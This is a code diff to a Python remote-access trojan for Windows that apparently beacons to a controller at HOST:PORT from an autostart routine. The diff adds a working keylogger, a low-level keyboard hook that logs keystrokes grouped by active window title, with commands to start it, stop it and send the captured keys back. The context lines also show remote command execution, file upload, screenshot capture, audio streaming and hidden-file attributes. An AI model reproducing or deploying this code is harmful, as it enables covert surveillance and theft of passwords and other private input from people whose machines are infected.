@@ -7,6 +7,7 @@ import os
 import subprocess
 import threading
 import ctypes
+from ctypes.wintypes import MSG
 import sys
 import platform
 import zlib
@@ -81,13 +82,37 @@ def pc_info():
         'activewindowtitle': get_window_title(),
     })
 
+shiftcodes = {
+    49: '!', 50: '@', 51: '#', 52: '$', 53: '%',
+    54: '^', 55: '&', 56: '*', 57: '(', 48: ')',
+    189: '_', 187: '+', 219: '{', 221: '}', 220: '|',
+    186: ':', 222: '"', 188: '<', 190: '>', 191: '?',
+}
+keycodes = {
+    160: '', 161: '', 32: '&nbsp;',
+    9: '<font color=blue>[TAB]</font>', 8: '<font color=red>[DEL]</font>', 162: '', 163: '', 144: '',
+    35: '', 34: '', 33: '', 36: '', 45: '', 145: '', 19: '', 13: '<br>'
+}
+updateCode = {
+    189: '-', 187: '=', 219: '[', 221: ']', 220: '\\',
+    186: ';', 222: '\'', 188: ',', 190: '.', 191: '/',
+    96: '0', 97: '1', 98: '2', 99: '3', 100: '4',
+    101: '5', 102: '6', 103: '7', 104: '8', 105: '9',
+    111: '/', 106: '*', 109: '-', 107: '+',
+    110: '.'
+}
 
-def screenshot():
-    return str({
-        'screenshot': screen_bits(),
-        'width': str(bmp_info.bmiHeader.biWidth),
-        'height': str(bmp_info.bmiHeader.biHeight),
-    })
+
+def update_key(k):
+    if updateCode.has_key(k):
+        return updateCode[k]
+    else:
+        return str(chr(k))
+
+
+def get_fptr(fn):
+    cmpfunc = ctypes.CFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_void_p))
+    return cmpfunc(fn)
 
 
 def send(sock, _data, mode, splitter='%:::%', end="[ENDOFMESSAGE]"):
@@ -114,8 +139,6 @@ def receive(sock, splitter='%:::%', end="[ENDOFMESSAGE]"):
 
 
 def upload(sock, filename, end="[ENDOFMESSAGE]"):
-    if not os.path.exists(filename):
-        return 'fileExistsError'
 
     sock.sendall(str(os.path.getsize(filename)))
     if sock.recv(2) == 'ok':
@@ -213,6 +236,32 @@ def set_content_attribute(filepath):
         Kernel32.SetFileAttributesW(filepath, 2)
 
 
+def get_screenshot():
+    return str({
+        'width': width,
+        'height': height,
+        'screenshotbits': screen_bits()
+    })
+
+
+def ls():
+    string = {
+        'path': os.getcwdu()
+    }
+    try:
+        for n, i in enumerate(os.listdir(u'.')):
+            string[str(n)] = {
+                'name': i,
+                'type': os.path.isfile(i),
+                'size': os.path.getsize(i),
+                'modified': time.ctime(os.path.getmtime(i)),
+                'hidden': has_hidden_attribute(i)
+            }
+        return str(string)
+    except WindowsError:
+        return 'windowsError'
+
+
 def get_window_title():
     get_foreground_window = User32.GetForegroundWindow
     get_window_text_length = User32.GetWindowTextLengthW
@@ -270,43 +319,48 @@ class ChildSocket(threading.Thread):
                     except:
                         pass
                     stdoutput = 'audioStopped'
+                elif data.startswith('startKeylogger'):
+                    try:
+                        keylogger_thread = Key()
+                        keylogger_thread.start()
+                        stdoutput = 'keyloggerStarted'
+                    except:
+                        stdoutput = 'keyloggerError'
+                elif data.startswith('stopKeylogger'):
+                    try:
+                        keylogger_thread.keyLogger.uninstall_hook_proc()
+                    except:
+                        pass
+                    stdoutput = 'keyloggerStopped'
+                elif data.startswith('getKeystokes'):
+                    try:
+                        stdoutput = str(keylogger_thread.logs)
+                        keylogger_thread.logs = {}
+                    except AttributeError:
+                        stdoutput = 'keystokesError'
                 elif data.startswith('getScreenshot'):
-                    stdoutput = str({
-                        'width': width,
-                        'height': height,
-                        'screenshotbits': screen_bits()
-                    })
+                    stdoutput = get_screenshot()
                 elif data.startswith("cd"):
                     try:
                         os.chdir(data[3:])
                         stdoutput = ""
                     except:
                         stdoutput = "Error opening directory"
-                elif data.startswith(("Activate")):
+                elif data.startswith('Activate'):
                     stdoutput = ''
-                elif data.startswith("runscript "):
+                elif data.startswith('runscript '):
                     stdoutput = execute(data[10:])
-                elif data.startswith("ls"):
-                    string = {}
-                    try:
-                        for n, i in enumerate(os.listdir(u'.')):
-                            string[n] = {}
-                            string[n]['name'] = i
-                            string[n]['type'] = os.path.isfile(i)
-                            string[n]['size'] = os.path.getsize(i)
-                            string[n]['modified'] = time.ctime(os.path.getmtime(i))
-                            string[n]['hidden'] = has_hidden_attribute(i)
-                        string['path'] = os.getcwdu()
-                        stdoutput = str(string)
-                    except WindowsError:
-                        stdoutput = 'Access is denied'
+                elif data.startswith('ls'):
+                    stdoutput = ls()
                 elif data.startswith('myinfo'):
                     stdoutput = self.mode + ' ' + self.id
                 else:
                     stdoutput = exec_(data)
                 send(self.socket, stdoutput, mode)
+                del stdoutput
             except socket.error:
                 return
+
 
 class AudioStreaming(threading.Thread):
     def __init__(self, sock, rate):
@@ -338,10 +392,76 @@ class AudioStreaming(threading.Thread):
         self.p.terminate()
 
 
-def start_child_socket(id, mode):
-    socketsBank[id] = ChildSocket(id, mode)
-    socketsBank[id].start()
-    return id
+class KeyLogger:
+    def __init__(self):
+        self.hooked = None
+
+    def install_hook_proc(self, pointer):
+        self.hooked = User32.SetWindowsHookExA(13, pointer, Kernel32.GetModuleHandleW(None), 0)
+        if not self.hooked:
+            return False
+        return True
+
+    def uninstall_hook_proc(self):
+        if self.hooked is None:
+            return
+        ctypes.windll.user32.UnhookWindowsHookEx(self.hooked)
+        self.hooked = None
+
+
+class Key(threading.Thread):
+    def __init__(self):
+        super(Key, self).__init__()
+
+        self.logs = {}
+
+    def write_key(self, log):
+        current_window_title = get_window_title()
+        if self.logs.has_key(current_window_title):
+            self.logs[current_window_title] += log
+        else:
+            self.logs[current_window_title] = log
+
+    def hook_proc(self, n_code, w_param, l_param):
+
+        if w_param is not 0x0100:
+            return User32.CallNextHookEx(self.keyLogger.hooked, n_code, w_param, l_param)
+
+        if keycodes.has_key(l_param[0]):
+            key = keycodes[l_param[0]]
+        else:
+            if User32.GetKeyState(0x14) & 1:
+                if User32.GetKeyState(0x10) & 0x8000:
+                    key = shiftcodes[l_param[0]] if shiftcodes.has_key(l_param[0]) else update_key(
+                        l_param[0]).lower()
+                else:
+                    key = update_key(l_param[0]).upper()
+            else:
+                if User32.GetKeyState(0x10) & 0x8000:
+                    key = shiftcodes[l_param[0]] if shiftcodes.has_key(l_param[0]) else update_key(
+                        l_param[0]).upper()
+                else:
+                    key = update_key(l_param[0]).lower()
+        self.write_key(key)
+
+        return User32.CallNextHookEx(self.keyLogger.hooked, n_code, w_param, l_param)
+
+    def start_keylogger(self):
+        msg = MSG()
+        User32.GetMessageA(ctypes.byref(msg), 0, 0, 0)
+
+    def run(self):
+        self.keyLogger = KeyLogger()
+        self.pointer = get_fptr(self.hook_proc)
+        if self.keyLogger.install_hook_proc(self.pointer):
+            pass
+        self.start_keylogger()
+
+
+def start_child_socket(id_, mode):
+    socketsBank[id_] = ChildSocket(id_, mode)
+    socketsBank[id_].start()
+    return id_
 
 
 def from_autostart():
@@ -352,7 +472,6 @@ def from_autostart():
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((HOST, PORT))
         except:
-            s.close()
             active = False
             time.sleep(5)
             continue
@@ -364,7 +483,7 @@ def from_autostart():
                     send(s, pc_info(), mode)
                     continue
                 if data == 'getScreen':
-                    send(s, screenshot(), mode)
+                    send(s, get_screenshot(), mode)
                     continue
                 if data.startswith('startChildSocket'):
                     send(s, start_child_socket(str(data.split(' ')[-1]), mode), mode)
@@ -382,7 +501,7 @@ def from_autostart():
                         elif data.startswith('startChildSocket'):
                             stdoutput = start_child_socket(str(data.split(' ')[-1]), mode)
                         elif data == 'getScreen':
-                            stdoutput = screenshot()
+                            stdoutput = get_screenshot()
                         else:
                             stdoutput = exec_(data)
                         send(s, stdoutput, mode=mode)
